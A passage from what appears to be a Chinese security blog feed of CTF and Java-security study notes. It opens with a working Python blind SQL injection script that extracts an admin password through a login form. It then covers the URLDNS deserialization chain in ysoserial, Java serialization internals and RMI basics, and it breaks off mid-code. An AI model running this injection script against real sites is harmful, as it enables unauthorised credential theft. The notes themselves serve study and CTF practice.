Safari/537.36&quot; ,<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">目标</span><br>table_name = &quot;admin&quot;<br>column_name = &quot;password&quot;<br><br>print( f&quot;[-] 开始利用线性扫描 (Linear Scan) 读取 &#123;table_name&#125;.&#123;column_name&#125; ...&quot; )<br>print( &quot;[-] 逻辑: ddd&#x27; OR (ascii &gt; j) #&quot; )<br>print( &quot;[-] 遇到 &#x27;username dont exist&#x27; 说明条件停止成立，锁定字符。&quot; )<br><br>final_data = &quot;&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">假设密码长度 1 到 40</span><br>for i in range( 1 , 41 ) :<br>    found_char = False<br><br>    # 遍历可见字符 ASCII 码 (32 - 127)<br>    # 类似于别人的 range(32, 128)<br>    for j in range( 32 , 128 ) :<br><br>        # 构造你的 Payload<br>        # ddd&#x27;or(ASCII(MID((SELECT(password)FROM(admin))FROM(&#123;i&#125;))))&gt;&#123;j&#125;#<br><br>        # 注意：这里 %23 是 # 的 URL编码。request data 字典有时会自动编码，有时不会，<br>        # 为了稳妥，我们直接在字符串里写 #，因为 requests 会帮我们转义 body<br>        payload_str = f&quot;ddd&#x27;or(ascii(mid((select(&#123;column_name&#125;)from(&#123;table_name&#125;))from(&#123;i&#125;)))&gt;&#123;j&#125;)#&quot;<br><br>        data_payload = &#123;<br>            &quot;username&quot; : payload_str ,<br>            &quot;password&quot; : &quot;admin&quot;<br>        &#125;<br><br>        try :<br>            # 发送请求<br>            res = requests.post( url , headers=headers , data=data_payload , timeout=3 )<br><br>            # --- 核心判断逻辑 (和别人的脚本一致) ---<br><br>            # 情况 1: 猜对了吗？(Payload &gt; j 为真)<br>            # 如果 ddd&#x27; OR True -&gt; 登录成功 -&gt; passwd error<br>            # 这意味着当前字符 ASCII 码比 j 大，还需要继续往后找<br>            if &quot;password error&quot; in res.text :<br>                continue  # 继续内层循环，j 加 1<br><br>            # 情况 2: 猜过头了吗？(Payload &gt; j 为假)<br>            # 如果 ddd&#x27; OR False -&gt; 用户不存在 -&gt; username dont exist<br>            # 这意味着当前字符 ASCII 码 不大于 j (即等于 j)，因为刚才 j-1 的时候还是 True<br>            elif &quot;username does not exist!&quot; in res.text :<br>                char = chr( j )<br>                final_data += char<br>                print( f&quot;[+] 第 &#123;i&#125; 位: &#123;char&#125; (ascii: &#123;j&#125;) | 当前: &#123;final_data&#125;&quot; )<br>                found_char = True<br>                break  # 找到了，跳出内层 j 循环，去读下一位 i<br><br>            # 其他情况（如报错）<br>            else :<br>                pass<br><br>        except Exception as e :<br>            print( f&quot;[!] Error: &#123;e&#125;&quot; )<br>            break<br><br>    # 如果遍历完 32-127 还没找到，说明这一位可能没有字符了（结束了）<br>    if not found_char :<br>        print( &quot;\n[*] 扫描结束。&quot; )<br>        break<br><br>print( f&quot;\n[Success] 最终密码: &#123;final_data&#125;&quot; )<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全学习笔记4-URLDNS链学习</title>
    <link href="/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    <url>/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="调试准备"><a href="#调试准备" class="headerlink" title="调试准备"></a>调试准备</h1><p>首先我们要明确我们调试的是ysoserial，先从GitHub上把ysoserial下载下来<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a>，然后用idea打开，这时会自动下载依赖项这些，若有问题，自行网上搜索解决方案。</p><p>然后找到自己想要调试的那条链的对应payload文件，比如我想调试URLDNS这条链：src/main/java/ysoserial/payloads/URLDNS.java</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769057378667-0afbdef7-7763-4837-914d-2b227827f869.png"></p><p>找到main函数左边的运行按钮，切换成调试，通常这时会报错：</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769057455164-3130768f-ac08-417c-a976-25438cd727f7.png"></p><p>这时因为默认参数为calc.exe，而URLDNS链是要一个url地址，在运行配置处修改参数，我这直接用的yakit的dnslog服务器，记得要加http://</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769058494357-bc412570-53c4-4ff2-bec7-8be57ef9d165.png"></p><p>然后就可以愉快打断点调试了</p><h1 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h1><p>先看URLDNS类中的getobject，这个方法返回了一个hashmap对象</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769058840900-b54683b6-d80b-45cd-a8d5-bbbf4445b63b.png"></p><p>我们知道反序列化触发是在readobject方法中，在readobject方法中找到putval方法，打上断点，因为在getobject的注释里（URLDNS.java文件第59行）写了是在计算hash的过程中触发了dnslog</p><p><font style="color:#bcbec4;background-color:#1e1f22;">During the put above, the URL’s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</font></p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769058961524-87276db7-80fb-4de4-b1d1-7e7f21a029ff.png"></p><p>开始调试，这时程序会卡在putval处</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769059325932-e8460304-4e8e-4123-bd56-d3986a05c3e6.png"></p><p>我们选择步入，选择hash函数，然后继续步入hashcode函数</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769059373434-800997c3-3403-4955-a869-194198225416.png"></p><p>然后看到hashcode里有一个gethostaddress方法</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769060516035-d977678e-e1a7-4099-8337-0d6013d6db77.png"></p><p>继续步入，可以看到调用了getbyname方法，触发dns查询</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769060558885-72af9cb5-2fbc-4cb1-9cb6-fd0c4061c1e6.png"></p><p>在yakit中看到dns记录如下：</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769062136448-d085ab1f-07f3-456d-b2a7-eaf27bd2c1e8.png"></p><p>在调试器中也可以看到调用栈</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769060799629-6ac0b9de-831f-4135-9562-76733cf68520.png"></p><p>HashMap-&gt;readObject</p><p>HashMap-&gt;hash</p><p>URL-&gt;hashCode</p><p>URLStreamHandler-&gt;hashCode</p><p>URLStreamHandler-&gt;getHostAddress</p><p>InetAddress-&gt;getByName</p><p>构造payload的时候，初始化一个java.net.URL对象，作为key放在HashMap中，然后设置这个URL对象的hashCode初始值为-1，这样反序列化时会重新计算hashCode，才能触发后面的DNS请求。（建议看p神原pdf文档，加入星球可得）</p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>javasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全学习笔记3--反序列化篇1</title>
    <link href="/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"/>
    <url>/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/</url>
    
    <content type="html"><![CDATA[<p>该篇笔记由Gemini3 pro preview模型总结而来。</p><h2 id="RCuvz"><font style="color:rgb(26, 28, 30);">1. 什么是反序列化？</font></h2><font style="color:rgb(26, 28, 30);">在网络通信中，JSON 和 XML 只能传递基本数据类型（字符串、整型等）。如果想传输一个复杂的</font>**<font style="color:rgb(26, 28, 30);">Java 对象</font>**<font style="color:rgb(26, 28, 30);">（包含属性、状态甚至逻辑），就需要将其转换为二进制流（序列化），接收方再将其还原为对象（反序列化）。</font><ul><li><strong><font style="color:rgb(26, 28, 30);">序列化 (Serialization)</font></strong><font style="color:rgb(26, 28, 30);">: 对象 -&gt; 二进制流 (</font><font style="color:rgb(50, 48, 44);">writeObject</font><font style="color:rgb(26, 28, 30);">)</font></li><li><strong><font style="color:rgb(26, 28, 30);">反序列化 (Deserialization)</font></strong><font style="color:rgb(26, 28, 30);">: 二进制流 -&gt; 对象 (</font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);">)</font></li></ul><hr><h2 id="o1Ky5"><font style="color:rgb(26, 28, 30);">2. 跨语言反序列化对比 (核心理论)</font></h2><font style="color:rgb(26, 28, 30);">理解不同语言的反序列化差异，是理解 Java 漏洞成因的关键。</font><table><thead><tr><th><strong><font style="color:rgb(26, 28, 30);">语言</font></strong></th><th><strong><font style="color:rgb(26, 28, 30);">机制</font></strong></th><th><strong><font style="color:rgb(26, 28, 30);">核心特点</font></strong></th><th><strong><font style="color:rgb(26, 28, 30);">漏洞成因</font></strong></th></tr></thead><tbody><tr><td><strong><font style="color:rgb(26, 28, 30);">Python</font></strong><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(Pickle)</font></td><td><strong><font style="color:rgb(26, 28, 30);">基于栈的虚拟机</font></strong></td><td><font style="color:rgb(26, 28, 30);">序列化数据里直接包含了</font><strong><font style="color:rgb(26, 28, 30);">指令</font></strong><font style="color:rgb(26, 28, 30);">（Opcode）。</font></td><td><strong><font style="color:rgb(26, 28, 30);">最危险</font></strong><font style="color:rgb(26, 28, 30);">。只要能传数据，就能直接让虚拟机执行任意指令/代码。</font></td></tr><tr><td><strong><font style="color:rgb(26, 28, 30);">PHP</font></strong><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(Unserialize)</font></td><td><strong><font style="color:rgb(26, 28, 30);">属性还原</font></strong></td><td><font style="color:rgb(26, 28, 30);">侧重于还原数据属性。依赖</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">__wakeup</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(醒来) 和</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">__destruct</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(销毁)。</font></td><td><font style="color:rgb(26, 28, 30);">漏洞通常由</font><strong><font style="color:rgb(26, 28, 30);">魔术方法</font></strong><font style="color:rgb(26, 28, 30);">触发，属于“反序列化</font><strong><font style="color:rgb(26, 28, 30);">后</font></strong><font style="color:rgb(26, 28, 30);">”的初始化操作。</font></td></tr><tr><td><strong><font style="color:rgb(26, 28, 30);">Java</font></strong><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(readObject)</font></td><td><strong><font style="color:rgb(26, 28, 30);">对象重建</font></strong></td><td><font style="color:rgb(26, 28, 30);">侧重于</font><strong><font style="color:rgb(26, 28, 30);">自定义还原过程</font></strong><font style="color:rgb(26, 28, 30);">。允许开发者介入反序列化流程。</font></td><td><font style="color:rgb(26, 28, 30);">漏洞源于</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">方法。它不仅还原属性，还允许开发者在还原</font><strong><font style="color:rgb(26, 28, 30);">过程中</font></strong><font style="color:rgb(26, 28, 30);">执行自定义代码。</font></td></tr></tbody></table><p><strong><font style="color:rgb(26, 28, 30);">一句话总结：</font></strong><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">Java 的</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">倾向于解决“如何还原一个完整对象”的问题，给予了开发者极大的自由度，也埋下了隐患。</font></p><hr><h2 id="l8iTu"><font style="color:rgb(26, 28, 30);">3. Java 序列化核心机制</font></h2><h3 id="FqTuk"><font style="color:rgb(26, 28, 30);">3.1 两个关键方法</font></h3><font style="color:rgb(26, 28, 30);">开发者可以在类中重写以下两个私有方法，来干预序列化过程：</font><ul><li><strong><font style="color:rgb(50, 48, 44);">writeObject(ObjectOutputStream s)</font></strong><font style="color:rgb(26, 28, 30);">:</font><ul><li><font style="color:rgb(26, 28, 30);">决定如何把对象写入流。</font></li><li><font style="color:rgb(26, 28, 30);">通常先调用</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">s.defaultWriteObject()</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">写入默认属性。</font></li><li><strong><font style="color:rgb(26, 28, 30);">关键点</font></strong><font style="color:rgb(26, 28, 30);">：可以调用</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">s.writeObject()</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">写入</font><strong><font style="color:rgb(26, 28, 30);">额外的数据</font></strong><font style="color:rgb(26, 28, 30);">（私货）。</font></li></ul></li><li><strong><font style="color:rgb(50, 48, 44);">readObject(ObjectInputStream s)</font></strong><font style="color:rgb(26, 28, 30);">:</font><ul><li><font style="color:rgb(26, 28, 30);">决定如何从流里恢复对象。</font></li><li><font style="color:rgb(26, 28, 30);">通常先调用</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">s.defaultReadObject()</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">恢复默认属性。</font></li><li><strong><font style="color:rgb(26, 28, 30);">关键点</font></strong><font style="color:rgb(26, 28, 30);">：必须按照写入顺序，调用</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">s.readObject()</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">读取那些</font><strong><font style="color:rgb(26, 28, 30);">额外的数据</font></strong><font style="color:rgb(26, 28, 30);">，并进行处理。</font></li></ul></li></ul><h3 id="wi1N7"><font style="color:rgb(26, 28, 30);">3.2 代码示例 (夹带私货)</font></h3><p><font style="color:rgb(93, 93, 95);"></font><strong><font style="color:rgb(28, 27, 27);">Java</font></strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">// 为了方便演示，把 Person 类和主类写在一个文件里</span><br><span class="hljs-comment">// Person 类去掉 public，只能在当前文件使用</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br><br>    <span class="hljs-comment">// 自定义序列化</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        s.defaultWriteObject(); <span class="hljs-comment">// 写入默认属性 (name)</span><br>        s.writeObject(<span class="hljs-string">&quot;This is extra data&quot;</span>); <span class="hljs-comment">// 【私货】写入额外数据</span><br>    &#125;<br><br>    <span class="hljs-comment">// 自定义反序列化</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject(); <span class="hljs-comment">// 读取默认属性</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> (String) s.readObject(); <span class="hljs-comment">// 【私货】读取额外数据</span><br>        System.out.println(<span class="hljs-string">&quot;反序列化成功，读到的私货是: &quot;</span> + msg);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;开始运行...&quot;</span>);<br><br>        <span class="hljs-comment">// 1. 创建一个对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        p.name = <span class="hljs-string">&quot;Hacker&quot;</span>;<br><br>        <span class="hljs-comment">// 2. 准备序列化流</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br><br>        <span class="hljs-comment">// 3. 开始序列化</span><br>        oos.writeObject(p);<br>        oos.close();<br><br>        <span class="hljs-comment">// 4. 获取序列化后的二进制数据</span><br>        <span class="hljs-type">byte</span>[] bytes = baos.toByteArray();<br><br>        <span class="hljs-comment">// 5. 打印 16 进制</span><br>        System.out.println(<span class="hljs-string">&quot;=== 序列化数据的 16 进制展示 ===&quot;</span>);<br>        printHex(bytes);<br><br>        <span class="hljs-comment">// 6. 保存到文件 person.bin (会在项目根目录下生成)</span><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;person.bin&quot;</span>)) &#123;<br>            fos.write(bytes);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;\n[+] 文件已保存为 person.bin&quot;</span>);<br><br>        <span class="hljs-comment">// 7. 验证反序列化</span><br>        System.out.println(<span class="hljs-string">&quot;\n=== 正在尝试反序列化... ===&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-comment">// 辅助工具：把字节数组打印成漂亮的 Hex 格式</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; bytes.length; i++) &#123;<br>            System.out.printf(<span class="hljs-string">&quot;%02X&quot;</span>, bytes[i]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="udOqv"><font style="color:rgb(26, 28, 30);">4. 序列化数据的内部结构 (底层协议)</font></h2><font style="color:rgb(26, 28, 30);">通过</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">SerializationDumper</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">分析 16 进制数据，可以发现 Java 序列化流中有一个特殊的区域：</font><p><img src="https://cdn.nlark.com/yuque/0/2025/png/57713373/1765960580218-64d71bf0-7f9e-4c1f-8fdd-6bcdd4470527.png"></p><h3 id="bhQdl"><font style="color:rgb(50, 48, 44);">objectAnnotation</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(对象注解/附注)</font></h3><ul><li><strong><font style="color:rgb(26, 28, 30);">定义</font></strong><font style="color:rgb(26, 28, 30);">：当类实现了</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">writeObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">方法时，它写入的所有自定义数据（即上面的“私货”），都会被存储在</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">TC_OBJECT</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">下面的</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">objectAnnotation</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">块中。</font></li><li><strong><font style="color:rgb(26, 28, 30);">对比</font></strong><font style="color:rgb(26, 28, 30);">：</font><ul><li><strong><font style="color:rgb(50, 48, 44);">classAnnotations</font></strong><font style="color:rgb(26, 28, 30);">: (RMI 篇提到) 存储类加载路径（Codebase URL），由</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">annotateClass</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">写入。</font></li><li><strong><font style="color:rgb(50, 48, 44);">objectAnnotation</font></strong><font style="color:rgb(26, 28, 30);">: 存储对象自定义数据，由</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">writeObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">写入。</font></li></ul></li></ul><h3 id="fSVWG"><font style="color:rgb(26, 28, 30);">为什么它很重要？</font></h3><ul><li><strong><font style="color:rgb(26, 28, 30);">HashMap 的例子</font></strong><font style="color:rgb(26, 28, 30);">：</font><font style="color:rgb(50, 48, 44);">HashMap</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">并没有把键值对（Key-Value）当成默认属性存储，而是全写进了</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">objectAnnotation</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">里。</font></li><li><strong><font style="color:rgb(26, 28, 30);">漏洞伏笔</font></strong><font style="color:rgb(26, 28, 30);">：反序列化</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">HashMap</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">时，</font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">会从这个区域读出 Key，并</font><strong><font style="color:rgb(26, 28, 30);">重新计算 Key 的 Hash 值</font></strong><font style="color:rgb(26, 28, 30);">。这一计算过程（</font><font style="color:rgb(50, 48, 44);">hashCode()</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">方法的调用）是众多反序列化利用链（Gadget Chain）的</font><strong><font style="color:rgb(26, 28, 30);">第一张多米诺骨牌</font></strong><font style="color:rgb(26, 28, 30);">（如 URLDNS 链）。</font></li></ul><hr><h2 id="Ic9bD"><font style="color:rgb(26, 28, 30);">5. 总结与审计思路</font></h2><ul><li><strong><font style="color:rgb(26, 28, 30);">攻击面</font></strong><font style="color:rgb(26, 28, 30);">：任何接收二进制流并执行</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">的地方（RMI, JMX, WebLogic, Jenkins 等）。</font></li><li><strong><font style="color:rgb(26, 28, 30);">利用核心</font></strong><font style="color:rgb(26, 28, 30);">：</font><ul><li><font style="color:rgb(26, 28, 30);">攻击者构造恶意的序列化数据。</font></li><li><font style="color:rgb(26, 28, 30);">服务端在</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">还原对象时，自动触发了恶意的代码逻辑。</font></li></ul></li><li><strong><font style="color:rgb(26, 28, 30);">后续学习</font></strong><font style="color:rgb(26, 28, 30);">：</font><ul><li><font style="color:rgb(26, 28, 30);">既然</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">HashMap</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">在反序列化时会重算 Hash，如果我把一个 URL 对象放进 HashMap 里，会发生什么？</font></li><li><font style="color:rgb(26, 28, 30);">这就是下一篇要学的</font><font style="color:rgb(26, 28, 30);"> </font><strong><font style="color:rgb(26, 28, 30);">URLDNS 利用链</font></strong><font style="color:rgb(26, 28, 30);">。</font></li></ul></li></ul><hr><p><strong><font style="color:rgb(26, 28, 30);">复习小贴士</font></strong><font style="color:rgb(26, 28, 30);">：<br></font><font style="color:rgb(26, 28, 30);">只要看到 </font><font style="color:rgb(50, 48, 44);">implements Serializable</font><font style="color:rgb(26, 28, 30);">，就要条件反射地去找有没有 </font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);"> 方法。如果有，仔细看它在还原对象时，是不是处理了什么不受信任的“私货”。</font></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>javasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java安全学习笔记2</title>
    <link href="/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/"/>
    <url>/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</url>
    
    <content type="html"><![CDATA[<h1 id="cWqfv">基础知识</h1>RMI的三个组成部分：<ul><li>Registry：类似电话簿。只负责记录哪个名字对应哪个对象。</li><li>Server：真正干活的人，提供实际的函数逻辑，并把自己的引用注册到Registry上。</li><li>Client：调用者。先查Registry，拿到Server的存根（stub），然后直接找Server办事。</li></ul><p>RMI的连接过程：</p><ul><li>第一次连接：Client-&gt;Registry（1099端口）</li></ul><blockquote><p>client问Hello在哪？Registry回答Hello在192.168.x.x的33789端口。这里传输序列化数据。</p></blockquote><ul><li>第二次连接：Client-&gt;Server(随机的33789端口)</li></ul><blockquote><p>Client说我要调用hello()方法。Server执行后返回结果。</p></blockquote><p>简单RMI实现代码(因为没系统学过Java，所以有一些疑问我让ai给了注释放里面了)：</p><p>Server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 